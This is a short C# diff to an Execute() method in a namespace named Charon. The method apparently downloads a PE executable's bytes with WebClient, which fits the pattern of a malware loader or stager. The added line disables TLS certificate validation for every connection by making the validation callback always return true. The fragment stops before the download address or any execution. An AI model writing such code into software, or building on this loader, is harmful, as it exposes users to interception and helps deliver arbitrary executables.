@@ -9,6 +9,7 @@ namespace Charon
         public static void Execute()
         {
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
 
             byte[] peBytes;
             using (WebClient wc = new WebClient())
